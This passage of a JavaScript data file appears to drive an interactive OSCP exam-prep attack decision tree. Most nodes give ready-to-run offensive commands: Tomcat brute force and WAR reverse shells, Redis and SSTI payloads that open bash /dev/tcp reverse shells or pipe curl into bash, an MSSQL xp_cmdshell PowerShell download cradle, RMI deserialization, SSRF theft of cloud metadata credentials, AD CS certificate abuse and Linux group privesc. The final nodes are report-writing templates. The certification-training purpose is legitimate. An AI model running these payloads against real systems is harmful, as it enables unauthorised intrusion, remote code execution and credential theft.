# admin:tomcat    manager:manager  both:both

# Brute force manager
hydra -L /usr/share/seclists/Usernames/tomcat-usernames.txt \\
  -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \\
  http-get://$ip:8080/manager/html

# Once in — deploy malicious WAR
msfvenom -p java/jsp_shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
# Upload via Manager > Deploy > WAR file
# Access: http://$ip:8080/shell/

# Ghostcat CVE-2020-1938 (AJP port 8009)
python3 ghostcat.py -p 8009 $ip`,
    warn: null,
    choices: [
      { label: "WAR deployed — got shell", next: "shell_upgrade" },
      { label: "Ghostcat file read — found creds", next: "creds_found" },
      { label: "No manager access", next: "searchsploit_web" },
    ],
  },

  redis: {
    phase: "RECON",
    title: "Redis (6379)",
    body: "Unauthenticated Redis is often RCE. Write SSH keys, cron jobs, or webshells depending on what Redis can reach.",
    cmd: `redis-cli -h $ip ping
redis-cli -h $ip info

# If authenticated — try default passwords
redis-cli -h $ip -a ""
redis-cli -h $ip -a "redis"
redis-cli -h $ip -a "password"

# RCE via authorized_keys
redis-cli -h $ip config set dir /root/.ssh
redis-cli -h $ip config set dbfilename authorized_keys
redis-cli -h $ip set payload "\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n"
redis-cli -h $ip save

# RCE via cron (if /var/spool/cron writable)
redis-cli -h $ip config set dir /var/spool/cron
redis-cli -h $ip config set dbfilename root
redis-cli -h $ip set payload "\\n\\n* * * * * bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\\n\\n"
redis-cli -h $ip save`,
    warn: "Check what user Redis runs as before choosing your attack path.",
    choices: [
      { label: "SSH key write — got root shell", next: "got_root_linux" },
      { label: "Cron job — got shell", next: "shell_upgrade" },
      { label: "Authenticated — needs password", next: "bruteforce" },
    ],
  },

  mssql: {
    phase: "RECON",
    title: "MSSQL (1433)",
    body: "MSSQL with xp_cmdshell enabled is instant RCE. SA account with default creds is common. impacket-mssqlclient handles everything.",
    cmd: `impacket-mssqlclient sa:''@$ip
impacket-mssqlclient sa:'sa'@$ip
impacket-mssqlclient sa:'password'@$ip -windows-auth

# Once connected:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"

# If xp_cmdshell disabled — enable it
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Read files
SQL> BULK INSERT tmp FROM 'C:\\Windows\\System32\\drivers\\etc\\hosts' WITH (ROWTERMINATOR='\\n');
SQL> SELECT * FROM tmp;`,
    warn: null,
    choices: [
      { label: "xp_cmdshell RCE — get reverse shell", next: "reverse_shell" },
      { label: "Got creds from DB", next: "creds_found" },
      { label: "Need creds", next: "bruteforce" },
    ],
  },

  java_rmi: {
    phase: "RECON",
    title: "Java RMI (1099)",
    body: "Exposed Java RMI registry is often exploitable via deserialization. ysoserial generates payloads for common gadget chains.",
    cmd: `nmap -p 1099 --script rmi-dumpregistry $ip
nmap -p 1099 --script rmi-vuln-classloader $ip

# Enumerate RMI registry
rmg enum $ip 1099

# ysoserial payload generation
# Find the right gadget chain — try CommonsCollections first
java -jar ysoserial.jar CommonsCollections6 'bash -c {bash,-i,>&,/dev/tcp/$LHOST/$LPORT,0>&1}' | \\
  java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit $ip 1099 CommonsCollections6 \\
  'bash -c {bash,-i,>&,/dev/tcp/$LHOST/$LPORT,0>&1}'

# remote-method-guesser (rmg) for modern exploitation
rmg exploit $ip 1099 --payload 'bash -c bash$IFS-i>&/dev/tcp/$LHOST/$LPORT<&1'`,
    warn: "Gadget chain depends on classpath — try CommonsCollections1-7, Spring, Groovy.",
    choices: [
      { label: "Got shell via deserialization", next: "shell_upgrade" },
      { label: "Registry accessible — searchsploit version", next: "searchsploit_web" },
    ],
  },

  ssrf: {
    phase: "WEB",
    title: "SSRF — Server-Side Request Forgery",
    body: "SSRF makes the server issue HTTP requests on your behalf — reaching internal services, cloud metadata, and local files that you cannot reach directly. Two types: basic (response returned to you) and blind (no response, only side-effects). The attack surface is any parameter that accepts a URL, hostname, or IP. Chain SSRF with internal services for RCE — Redis, Memcached, internal admin panels, and cloud IMDSv1 are the highest-value targets.",
    cmd: `# ── STEP 1: CONFIRM SSRF ─────────────────
# Start a listener — does the server call back?
nc -nlvp 80
# Or python server for cleaner logging:
python3 -m http.server 80

# Probe the parameter
curl -s "http://$ip/page?url=http://$LHOST/"
# If your listener gets a hit → confirmed SSRF
# No hit → try other protocols, check blind path

# ── STEP 2: PROBE LOCALHOST SERVICES ─────
# What services run internally that nmap never saw?
curl -s "http://$ip/page?url=http://127.0.0.1/"
curl -s "http://$ip/page?url=http://127.0.0.1:8080/"
curl -s "http://$ip/page?url=http://localhost/"

# Port scan via SSRF (time the response: fast=open, slow/error=closed)
for port in 21 22 25 80 443 445 3306 3389 5432 5985 6379 8080 8443 8888 9200 27017; do
  echo -n "Port $port: "
  result=$(curl -s -o /dev/null -w "%{http_code} %{time_total}" \\
    --max-time 3 "http://$ip/page?url=http://127.0.0.1:$port/")
  echo "$result"
done

# ── STEP 3: FILE READ ─────────────────────
# file:// protocol — direct filesystem read
curl -s "http://$ip/page?url=file:///etc/passwd"
curl -s "http://$ip/page?url=file:///etc/shadow"
curl -s "http://$ip/page?url=file:///home/user/.ssh/id_rsa"
curl -s "http://$ip/page?url=file:///var/www/html/config.php"
# Windows:
curl -s "http://$ip/page?url=file:///C:/Windows/win.ini"
curl -s "http://$ip/page?url=file:///C:/inetpub/wwwroot/web.config"

# ── STEP 4: CLOUD METADATA ────────────────
# AWS IMDSv1 (no auth required — jackpot if present)
curl -s "http://$ip/page?url=http://169.254.169.254/latest/meta-data/"
curl -s "http://$ip/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns role name → then:
curl -s "http://$ip/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
# Gives: AccessKeyId, SecretAccessKey, Token → AWS CLI access

# GCP metadata
curl -s "http://$ip/page?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \\
  -H "Metadata-Flavor: Google"

# Azure
curl -s "http://$ip/page?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \\
  -H "Metadata: true"

# ── STEP 5: INTERNAL SERVICE ATTACK ──────
# Redis (6379) — write SSH keys via gopher
# Gopher protocol sends raw TCP — attack Redis/Memcached/SMTP directly
curl -s "http://$ip/page?url=gopher://127.0.0.1:6379/_FLUSHALL%0d%0a"
# Full Redis SSH key injection via gopher (URL-encode the payload):
# Construct: CONFIG SET dir /root/.ssh → CONFIG SET dbfilename authorized_keys
#            SET payload "\n\nYOUR_SSH_PUBKEY\n\n" → BGSAVE

# Internal admin panels
curl -s "http://$ip/page?url=http://127.0.0.1:8080/admin"
curl -s "http://$ip/page?url=http://127.0.0.1:9000/"    # Portainer, etc.

# ── STEP 6: FILTER BYPASS ─────────────────
# IP in decimal
curl -s "http://$ip/page?url=http://2130706433/"        # 127.0.0.1 in decimal
# IP in hex
curl -s "http://$ip/page?url=http://0x7f000001/"
# IPv6 localhost
curl -s "http://$ip/page?url=http://[::1]/"
curl -s "http://$ip/page?url=http://[::ffff:127.0.0.1]/"
# DNS rebinding / open redirect on same domain
curl -s "http://$ip/page?url=http://localtest.me/"      # resolves to 127.0.0.1
# URL scheme variations
curl -s "http://$ip/page?url=http://127.1/"             # short form
curl -s "http://$ip/page?url=http://0/"                 # also 0.0.0.0

# ── STEP 7: BLIND SSRF ────────────────────
# No response returned — detect via out-of-band callback
# Use interactsh:
interactsh-client
curl -s "http://$ip/page?url=http://YOUR.oast.fun/"
# Hit on interactsh = confirmed blind SSRF
# Use DNS record: nslookup YOUR.oast.fun confirms DNS resolution`,
    warn: "SSRF filter bypass: if localhost is blocked, try 0x7f000001, 2130706433, 127.1, [::1]. If http:// is blocked try dict://, gopher://, file://. Gopher protocol is the highest-value SSRF escalation — it lets you send raw TCP to Redis, Memcached, and SMTP and can chain to RCE. IMDSv2 (AWS) requires a PUT request for a token first — IMDSv1 is the unauthenticated jackpot.",
    choices: [
      { label: "Internal service reached — enumerate it", next: "pivot_portscan" },
      { label: "File read working — escalate to LFI", next: "lfi" },
      { label: "Cloud metadata — got IAM credentials", next: "creds_found" },
      { label: "Redis via gopher — write SSH key", next: "got_root_linux" },
      { label: "Internal admin panel reached", next: "web_enum" },
    ],
  },

  ssti: {
    phase: "WEB",
    title: "SSTI — Server-Side Template Injection",
    body: "SSTI happens when user input is concatenated directly into a template string rather than passed as a variable. The engine evaluates the expression — and that evaluation is RCE. Engine identification is the critical first step: the math probe tells you which engine you are dealing with, and each engine has completely different payloads. Jinja2 sandboxes require a subclass traversal to escape. Always confirm execution with id before trying a reverse shell.",
    cmd: `# ── STEP 1: DETECTION PROBE ──────────────
# Inject math into every input field — names, search, email, headers
# If the app evaluates it and returns 49, you have SSTI
{{7*7}}
\${7*7}
#{7*7}
<%= 7*7 %>
{7*7}
\${{7*7}}

# ── STEP 2: ENGINE FINGERPRINT ────────────
# Decision tree:
#   {{7*7}} → 49?
#     YES → Jinja2 or Twig
#       {{7*'7'}} → 7777777?  → Jinja2 (Python)
#       {{7*'7'}} → 49?       → Twig (PHP)
#     NO  → try \${7*7}
#       \${7*7} → 49?          → FreeMarker or Thymeleaf (Java)
#   Try <%= 7*7 %>
#       → 49?                  → ERB (Ruby) or EJS (Node)
#   Try #{7*7}
#       → 49?                  → Ruby (non-ERB) or Pebble

# ── STEP 3: JINJA2 (Python / Flask) ──────
# Confirm engine first:
{{7*'7'}}     # returns 7777777 = confirmed Jinja2

# RCE — simplest (if not sandboxed):
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# RCE via request object:
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Sandbox escape via subclass traversal:
# Find the index of subprocess.Popen in __subclasses__() — varies by app
# Method 1: find it manually
{{''.__class__.__mro__[1].__subclasses__()}}
# Look for <class 'subprocess.Popen'> — note its index (e.g. 396)
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Method 2: search for it (more reliable across versions)
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if 'Popen' in c.__name__ %}{{c('id',shell=True,stdout=-1).communicate()}}{% endif %}
{% endfor %}

# ── STEP 4: TWIG (PHP) ────────────────────
# Confirm: {{7*'7'}} returns 49 (not 7777777)

{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{'/etc/passwd'|file_excerpt(1,30)}}

# Twig v2/v3 (different syntax):
{{['id','']|sort('system')}}

# ── STEP 5: FREEMARKER (Java) ─────────────
<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}
\${ex("id")}

# Alternative:
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>

# ── STEP 6: ERB (Ruby / Rails) ────────────
<%= system('id') %>
<%= \`id\` %>
<%= IO.popen('id').readlines() %>

# ── STEP 7: THYMELEAF (Java / Spring) ─────
# Only in unprotected contexts (th:text with user input)
\${T(java.lang.Runtime).getRuntime().exec('id')}
__\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

# ── STEP 8: GET REVERSE SHELL ─────────────
# Once id works, upgrade to reverse shell
# Jinja2 example:
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"').read()}}

# Or write a shell script and execute it:
{{config.__class__.__init__.__globals__['os'].popen('curl http://$LHOST/shell.sh|bash').read()}}

# Twig example:
{{['bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"']|filter('system')}}`,
    warn: "The subclass index for subprocess.Popen varies between Python versions and what packages are installed. If index 396 fails, dump the full subclass list into a file and grep for 'Popen' to find the correct index. Jinja2 sandbox escape requires __mro__[1] to be <class 'object'> — confirm this first. If the app strips {{ }}, try {%25 %25} (URL-encoded Jinja2 block tags) or inject via HTTP headers (User-Agent, Referer) which are sometimes passed directly to templates.",
    choices: [
      { label: "RCE confirmed — get reverse shell", next: "reverse_shell" },
      { label: "Jinja2 sandbox — subclass traversal needed", next: "reverse_shell" },
      { label: "Twig confirmed — PHP filter payload", next: "reverse_shell" },
      { label: "Java engine — FreeMarker/Thymeleaf payload", next: "reverse_shell" },
      { label: "Reflected but no execution — filter bypass", next: "web_fuzz_deep" },
    ],
  },

  ad_manual: {
    phase: "AD",
    title: "AD Manual Enum — BloodHound Dead End",
    body: "BloodHound ran clean — no obvious path to DA. Go manual. There are four categories that automated tools consistently miss: description fields with embedded passwords, local admin rights on non-DC machines, accessible shares with credential material, and AD CS (certificate templates). Work through each methodically. Find-LocalAdminAccess is slow but pays off — run it in the background while you do other checks.",
    cmd: `# ── DESCRIPTION FIELDS — HIGHEST YIELD ───
# Admins frequently leave passwords in user description fields
# BloodHound shows this in the node info panel but easy to miss

# From Windows (PowerView):
Get-DomainUser | select samaccountname,description | where {$_.description}
Get-DomainComputer | select name,description | where {$_.description}
Get-DomainGroup | select name,description | where {$_.description}

# From Kali (ldapsearch):
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \\
  -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" \\
  "(objectClass=user)" sAMAccountName description \\
  | grep -A1 "description:"

# From Kali (CME — faster):
crackmapexec ldap $DC_IP -u $USER -p '$PASS' -M get-desc-users

# ── LOCAL ADMIN HUNTING ────────────────────
# Find machines where your current account has local admin
# (often missed — BloodHound only shows explicit grants, not inherited)
Find-LocalAdminAccess    # runs in background — slow, worth it
# Or targeted:
crackmapexec smb $SUBNET/24 -u $USER -p '$PASS' --continue-on-success
# (Pwn3d!) = local admin → shell

# Test specific machine:
crackmapexec smb $TARGET -u $USER -p '$PASS'

# ── SHARE HUNTING ─────────────────────────
# Readable shares across the domain often contain scripts with creds
Find-DomainShare -CheckShareAccess   # PowerView — finds all accessible shares
# Or from Kali:
crackmapexec smb $SUBNET/24 -u $USER -p '$PASS' --shares \\
  | grep READ

# Spider all accessible shares for credential material:
crackmapexec smb $DC_IP -u $USER -p '$PASS' -M spider_plus
# Check NETLOGON + SYSVOL for scripts, GPP passwords:
smbclient //$DC_IP/NETLOGON -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; prompt OFF; ls'
smbclient //$DC_IP/SYSVOL -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; prompt OFF; ls'
# GPP passwords in Groups.xml:
crackmapexec smb $DC_IP -u $USER -p '$PASS' -M gpp_password

# ── AD CS — CERTIFICATE TEMPLATES ─────────
# Vulnerable cert templates = privesc to DA without any password
# Check with Certipy (from Kali):
certipy find -u $USER@$DOMAIN -p '$PASS' -dc-ip $DC_IP -vulnerable
# Common vulnerabilities:
# ESC1: SAN in CSR + client auth → request cert as DA
# ESC4: write rights on template → make it vulnerable
# ESC8: NTLM relay to AD CS HTTP endpoint

# If ESC1 found:
certipy req -u $USER@$DOMAIN -p '$PASS' \\
  -ca CA_NAME -target $DC_IP \\
  -template VulnerableTemplate \\
  -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
# Gives: NTLM hash for administrator → evil-winrm

# ── KERBEROS POLICY + MISC ─────────────────
# Password policy (for spray planning):
crackmapexec smb $DC_IP -u $USER -p '$PASS' --pass-pol

# Trust relationships (other domains):
Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType
nltest /domain_trusts

# Machine account quotas (for RBCD attacks):
Get-DomainObject -Identity "DC=$DOMAIN_DC,DC=$DOMAIN_TLD" \\
  | select ms-ds-machineaccountquota
# Default is 10 — means any user can create computer accounts → enables RBCD

# ── NET COMMANDS — QUICK ENUMERATION ──────
net user /domain                        # all domain users
net group /domain                       # all groups
net group "Domain Admins" /domain       # DA members
net group "Enterprise Admins" /domain   # EA members (forest-wide)
net localgroup administrators           # local admin group on this machine`,
    warn: "Description field password hunting is the single most overlooked AD vector — automate it with CME's get-desc-users module against every domain you're in. AD CS (Certipy) finds misconfigurations that exist on most enterprise domains and BloodHound doesn't check by default. Machine account quota of 10 means RBCD is always available — you can create a fake computer account and chain to RBCD against any machine you have GenericWrite over.",
    choices: [
      { label: "Password in description field", next: "creds_found" },
      { label: "Local admin on machine — lateral move", next: "lateral_movement" },
      { label: "Share with credential material", next: "smb_loot" },
      { label: "AD CS ESC1/ESC4/ESC8 found", next: "adcs" },
      { label: "Domain trust — attack other domain", next: "ad_start" },
      { label: "Still nothing — spray carefully", next: "ad_spray" },
    ],
  },

  linux_privesc_extra: {
    phase: "LINUX",
    title: "Linux Privesc — Groups and PATH",
    body: "Docker, LXD, disk, adm group memberships are instant root. Writable PATH directory before a privileged binary call is reliable.",
    cmd: `id   # check ALL group memberships

# Docker group — instant root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# LXD group — instant root
lxc image import ./alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# disk group — read raw disk
debugfs /dev/sda1
debugfs> cat /etc/shadow

# adm group — read logs (find creds in logs)
grep -ri "password\\|pass\\|auth" /var/log/ 2>/dev/null

# Writable PATH hijack
echo $PATH
find / -writable -type d 2>/dev/null | grep -v proc
# Create malicious binary ahead of real one in PATH
echo -e '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH`,
    warn: null,
    choices: [
      { label: "Docker/LXD/disk group — ROOT!", next: "got_root_linux" },
      { label: "PATH hijack worked — ROOT!", next: "got_root_linux" },
      { label: "Nothing — kernel exploit", next: "kernel_exploit" },
    ],
  },

  // ══════════════════════════════════════════
  //  DOCUMENTATION — MITRE ATT&CK SUBGRAPH
  // ══════════════════════════════════════════

  reporting: {
    phase: "REPORT",
    title: "Documentation — The Path",
    body: "Structure your notes around MITRE ATT&CK tactics. Walk each tactic in order — it forces completeness and produces a report that speaks the language of every SOC, client, and hiring manager. Document AS YOU GO. OffSec has failed candidates with all flags for insufficient evidence.",
    cmd: `# ══ PRE-EXAM SETUP — DO THIS BEFORE CLICKING START ══
mkdir -p ~/exam/{10.10.10.1,10.10.10.2,10.10.10.3,dc01,dc02}/{scans,exploits,loot,screenshots,notes}
# One folder per target IP

# ══ SCREENSHOT REQUIREMENTS — OSCP 2024 FORMAT ══
# OffSec requires SPECIFIC content in each screenshot
# Missing content = points deducted even with a valid flag

# local.txt screenshot MUST show:
# 1. Contents of local.txt (cat local.txt or type local.txt)
# 2. Your current user (whoami or id)
# 3. IP address of the machine (ipconfig or ip a)
# Combine in one command:
echo "=== LOCAL.TXT ===" && cat local.txt && id && ip a | grep "inet "
type local.txt && whoami && ipconfig   # Windows

# proof.txt screenshot MUST show:
# 1. Contents of proof.txt (cat proof.txt or type proof.txt)
# 2. Your current user — MUST be root/SYSTEM (id or whoami)
# 3. IP address of the machine (ip a or ipconfig)
echo "=== PROOF.TXT ===" && cat proof.txt && id && ip a | grep "inet "
type proof.txt && whoami && ipconfig   # Windows (verify SYSTEM)

# ══ MINIMUM SCREENSHOTS PER MACHINE ══════
# The five required evidence screenshots:
# 1. Initial foothold — first shell (id/whoami + hostname)
# 2. local.txt — per requirements above
# 3. Privilege escalation vector — the command that elevated you
# 4. proof.txt — per requirements above
# 5. Evidence of the initial vulnerability — the nmap version,
#    the exploit output, the command injection proof

# ══ DURING-EXAM NOTE TEMPLATE ════════════
# Copy this structure into your CherryTree/Obsidian for each machine:

## Machine: [IP]
### Recon
- nmap full scan: [date/time]
- Open ports: [list]
- Interesting findings: [versions, hostnames, notes]

### Initial Access
- Vulnerability: [name or CVE]
- Exploit: [command or tool used]
- Shell type: [nc/pwncat/msf]
- User obtained: [username]

### Privilege Escalation
- Vector: [sudo/SUID/service/token/etc]
- Command: [exact command]
- Evidence: [what confirmed it worked]

### Flags
- local.txt: [hash]  — screenshot taken: Y
- proof.txt: [hash]  — screenshot taken: Y

# ══ ATT&CK TACTIC ORDER (for report body) ══
# TA0043 Reconnaissance    → nmap output, service discovery
# TA0001 Initial Access    → exploit used, CVE, how foothold was gained
# TA0002 Execution         → how code was executed (shell, script, etc)
# TA0004 Privilege Escalation → exact vector and commands
# TA0006 Credential Access → any hashes/creds obtained
# TA0008 Lateral Movement  → PtH, WinRM, psexec between machines
# TA0007 Discovery         → post-shell enumeration
# TA0040 Impact            → flags, proof of access

# ══ REPORT ASSEMBLY (24-hour window) ══════
# You have 24 hours AFTER the exam ends to submit
# Use the OffSec provided Word template (download from exam control panel)
# One machine section per machine in the report
# Proofread: OSID on every page, all screenshots captioned
# Archive: 7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
# Upload to: https://upload.offsec.com`,
    warn: "OffSec has failed candidates who owned all five machines with insufficient report evidence. The proof.txt screenshot MUST show root/SYSTEM + IP + flag contents in a single screenshot. A flag screenshot without the IP address or without showing privilege level has failed candidates. Take the screenshot immediately when you get the flag — before doing anything else.",
    choices: [
      { label: "TA0043 — Reconnaissance", next: "doc_recon" },
      { label: "TA0001 — Initial Access", next: "doc_initial_access" },
      { label: "TA0004 — Privilege Escalation", next: "doc_privesc" },
      { label: "TA0006 — Credential Access", next: "doc_cred_access" },
      { label: "TA0008 — Lateral Movement", next: "doc_lateral" },
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Final submission checklist", next: "doc_submit" },
      { label: "Back to hacking", next: "start" },
    ],
  },

  doc_recon: {
    phase: "REPORT",
    title: "TA0043 — Reconnaissance",
    body: "Document every service you identified and how. This section justifies your attack path — reviewers need to see that you found the vulnerability through methodical enumeration, not luck.",
    cmd: `# TA0043 Reconnaissance — note template
# Technique IDs to reference:
#   T1595 — Active Scanning (nmap, masscan)
#   T1592 — Gather Host Information (service versions)
#   T1590 — Gather Network Information (DNS, subnet mapping)
#   T1046 — Network Service Discovery

## Recon Summary for $ip
Host: $ip
OS Guess: [Linux/Windows + version]
Open Ports: [list]

## Services Identified
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 80   | HTTP    | Apache 2.4.49 | CVE-2021-41773 candidate |
| 445  | SMB     | Samba 4.x     | Anonymous auth? Y/N |

## Key Findings
- [What stood out — outdated version, misconfig, anonymous access]
- [Why you chose the attack path you did]

## Evidence
- Screenshot: nmap full scan output
- Screenshot: service version banner
- File: ~/results/$ip/scans/full.txt`,
    warn: "Version numbers matter — 'Apache on port 80' fails. 'Apache 2.4.49 on port 80, CVE-2021-41773 confirmed' passes.",
    choices: [
      { label: "TA0001 — Initial Access", next: "doc_initial_access" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_initial_access: {
    phase: "REPORT",
    title: "TA0001 — Initial Access",
    body: "The foothold section. Be exact — command, payload, response. This is the section most candidates under-document because they're excited to move on. Slow down.",
    cmd: `# TA0001 Initial Access — note template
# Technique IDs to reference:
#   T1190 — Exploit Public-Facing Application
#   T1078 — Valid Accounts (found creds)
#   T1566 — Phishing (client-side attacks)
#   T1203 — Exploitation for Client Execution

## Initial Access — $ip

Vulnerability: [CVE / vuln name / misconfiguration]
Service: [port + service]
Technique: T1190 / T1078 / T1566 (pick one)

## Exploitation Steps
1. [Exact command or tool used]
2. [Payload delivered / creds used]
3. [Response confirming execution]

## Shell Obtained
Type: [reverse/bind/web shell]
User: [whoami output]
Command used:
  [paste exact command that got the shell]

## Evidence
- Screenshot: exploit execution + response
- Screenshot: whoami + hostname + ip immediately after shell
- File: ~/results/$ip/exploits/payload.txt (save your payload)`,
    warn: "Save your exact payload to disk before moving on. You will need to reproduce this in the report and you will not remember the exact syntax 8 hours later.",
    choices: [
      { label: "TA0002 — Execution", next: "doc_execution" },
      { label: "TA0004 — Privilege Escalation", next: "doc_privesc" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_execution: {
    phase: "REPORT",
    title: "TA0002 — Execution",
    body: "Document how you ran code on the target. Often overlaps with Initial Access but worth its own note — especially for multi-stage payloads, web shells, or script interpreters.",
    cmd: `# TA0002 Execution — note template
# Technique IDs to reference:
#   T1059.001 — PowerShell
#   T1059.003 — Windows Command Shell (cmd.exe)
#   T1059.004 — Unix Shell
#   T1059.007 — JavaScript (XSS/Node)
#   T1203 — Exploitation for Client Execution
#   T1106 — Native API

## Execution — $ip

Interpreter/Method: [PowerShell / bash / cmd / web shell / etc.]
Technique: T1059.00x

## Commands Run on Target
# Document exactly what you ran — copy from terminal history
history | tail -50

## Payload Details
Type: [Meterpreter / netcat / python / aspx shell / etc.]
Staged/Stageless: [staged uses stager + stage, stageless is single binary]
Delivery method: [uploaded via / triggered via / embedded in]

## Evidence
- Screenshot: payload execution
- Screenshot: callback received on attacker machine
- File: ~/results/$ip/exploits/ (save payload file)`,
    warn: "If you used msfvenom, save the exact generation command. 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=443 -f exe > shell.exe' belongs in your notes verbatim.",
    choices: [
      { label: "TA0004 — Privilege Escalation", next: "doc_privesc" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_privesc: {
    phase: "REPORT",
    title: "TA0004 — Privilege Escalation",
    body: "The most important section for OSCP. Document the exact vector — not just 'I ran linpeas.' What specific finding led to root? Show before and after privilege states.",
    cmd: `# TA0004 Privilege Escalation — note template
# Technique IDs to reference:
#   T1548.001 — Setuid/Setgid (Linux SUID)
#   T1548.003 — Sudo and Sudo Caching
#   T1053.003 — Cron Job (scheduled task)
#   T1053.005 — Scheduled Task (Windows)
#   T1543.003 — Windows Service
#   T1134 — Access Token Manipulation
#   T1068 — Exploitation for Privilege Escalation (kernel/CVE)

## Privilege Escalation — $ip

Vector: [SUID / sudo / cron / service / token / CVE / etc.]
Technique: T1548.001 / T1053.003 / etc. (pick closest)

## Low-Privilege State (BEFORE)
whoami && id && hostname
# [paste output]

## Escalation Steps
1. [How you found the vector — linpeas finding, manual check]
2. [Exact command to exploit]
3. [Any intermediate steps]

## Root/SYSTEM State (AFTER)
whoami && id
# [paste output — must show root or SYSTEM]

## Evidence
- Screenshot: low-priv whoami BEFORE escalation
- Screenshot: the specific finding (sudo -l / find SUID / crontab)
- Screenshot: exploitation command
- Screenshot: root/SYSTEM whoami AFTER
- Screenshot: proof.txt with whoami + hostname + ip in same frame`,
    warn: "TWO whoami screenshots required — before AND after. One screenshot of root alone is not sufficient evidence of the escalation path.",
    choices: [
      { label: "TA0006 — Credential Access", next: "doc_cred_access" },
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_cred_access: {
    phase: "REPORT",
    title: "TA0006 — Credential Access",
    body: "Document every credential found — hashes, plaintext, tokens, keys. These often chain into lateral movement. Even creds you didn't use are worth noting for the report.",
    cmd: `# TA0006 Credential Access — note template
# Technique IDs to reference:
#   T1003.001 — LSASS Memory (mimikatz, pypykatz)
#   T1003.002 — SAM (reg save + impacket)
#   T1003.003 — NTDS.dit (domain controller)
#   T1003.006 — DCSync
#   T1552.001 — Credentials in Files
#   T1552.004 — Private Keys (SSH keys, PEM)
#   T1558.003 — Kerberoasting
#   T1558.004 — AS-REP Roasting

## Credential Access — $ip

Method: [mimikatz / secretsdump / file search / kerberoast / etc.]
Technique: T1003.001 / T1552.001 / T1558.003 (pick closest)

## Credentials Found
| Type     | Username | Value                    | Cracked? |
|----------|----------|--------------------------|----------|
| NTLM     | admin    | aad3b435b51404ee...      | Y: Pass1 |
| SSH Key  | root     | /home/user/.ssh/id_rsa   | N/A      |
| Plaintext| svc_sql  | Winter2023!              | N/A      |

## Cracking Commands Used
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=NT hashes.txt --wordlist=rockyou.txt

## Evidence
- Screenshot: dump command + output
- Screenshot: cracked hash result
- File: ~/results/$ip/loot/hashes.txt`,
    warn: "Never paste real credentials into a report without client approval — mask with [REDACTED] in deliverables. For the OSCP exam, show the full value.",
    choices: [
      { label: "TA0008 — Lateral Movement", next: "doc_lateral" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_lateral: {
    phase: "REPORT",
    title: "TA0008 — Lateral Movement",
    body: "The section most candidates skip because it feels like 'just pivoting.' Document the full chain — how you moved from one host to another, what credential or technique enabled it, and what you found on the other side.",
    cmd: `# TA0008 Lateral Movement — note template
# Technique IDs to reference:
#   T1021.001 — Remote Desktop Protocol
#   T1021.002 — SMB/Windows Admin Shares
#   T1021.004 — SSH
#   T1021.006 — WinRM
#   T1550.002 — Pass the Hash
#   T1550.003 — Pass the Ticket
#   T1563 — Remote Service Session Hijacking

## Lateral Movement — $ip → $TARGET

From: $ip ([username] @ [hostname])
To: $TARGET ([username] @ [hostname])
Method: [PtH / SSH / WinRM / RDP / SMB exec]
Technique: T1021.002 / T1550.002 (pick closest)

## Movement Steps
1. [Credential/ticket used to move]
2. [Exact command]
3. [Confirmation of access]

## Tunnel Setup (if applicable)
# Document your pivot setup — Ligolo / Chisel / SSH
# Include listener config, agent config, route added

## Evidence
- Screenshot: command on source machine
- Screenshot: shell/access confirmed on target machine
- Screenshot: tunnel established (if pivoting)
- Network diagram: hand-drawn or ASCII showing the chain`,
    warn: "Draw the network. Even ASCII art. 'Attacker → Machine 1 (pivot) → Machine 2 → DC' on one line is enough. Reviewers need to see you understood the topology.",
    choices: [
